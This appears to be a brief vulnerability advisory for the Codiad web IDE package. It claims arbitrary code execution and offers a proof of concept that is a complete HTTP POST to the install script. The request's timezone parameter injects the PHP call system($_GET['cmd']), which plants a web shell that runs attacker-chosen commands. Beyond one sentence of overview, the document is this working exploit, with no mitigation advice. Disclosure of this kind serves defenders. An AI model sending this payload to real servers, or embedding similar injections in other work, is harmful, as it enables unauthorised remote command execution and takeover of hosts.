# Overview

`codiad/codiad` is a web-based IDE framework with a small footprint and minimal requirements, this package are vulnerable to Arbitrary Code Execution.

# Proof of Concept

```
POST /components/install/process.php HTTP/1.1
Host: codiad.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml xml,application/xml;q=0.9,_/_;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Content-type: application/x-www-form-urlencoded
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 170

path=/var/www/html/data&amp;username=/tmp/dada&amp;password=/tmp/dada&amp;project_name=/tmp/dada&amp;project_path=/var/www/html/data/data&amp;timezone='")%3b+system($_GET["cmd"])%3b+print("'
```
